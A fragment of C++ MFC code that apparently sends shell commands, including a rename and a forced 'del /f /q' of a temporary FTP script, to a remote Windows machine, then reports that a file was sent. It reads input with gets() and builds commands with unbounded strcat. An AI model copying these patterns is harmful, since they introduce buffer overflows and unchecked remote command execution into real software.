		gets(cmdd);
		USES_CONVERSION;
		sendcmd(A2W(cmdd),135);
		memset(cmdd,0,sizeof(cmdd));
	}
	USES_CONVERSION;
	SetDlgItemText(IDC_EDIT11,szPath);

	fclose(stdin);
	char cmp[100]={0};
	strcat(cmp,"rename \"C:\\file.dat\" \"");
	strcat(cmp,getfilename());
	strcat(cmp,"\"");
	int waiti=GetDlgItemInt(IDC_EDIT13,NULL,TRUE);
	Sleep(waiti*1000);
	sendcmd(A2W(cmp),30);
	sendcmd(L"del /f /q \"C:/ftpc.txt\"",0);
	MessageBoxA(kp,"文件发送成功","报告",MB_OK);
	//MessageBoxA(kp,cmp,"报告",MB_OK);
}


void netw::OnIpnFieldchangedIpaddress1(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMIPADDRESS pIPAddr = reinterpret_cast<LPNMIPADDRESS>(pNMHDR);
	wchar_t ipd1[40]={0};
	::GetDlgItemTextW(kp,IDC_IPADDRESS1,ipd1,30);
	::SetDlgItemTextW(kp,IDC_IPADDRESS2,ipd1);
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
}
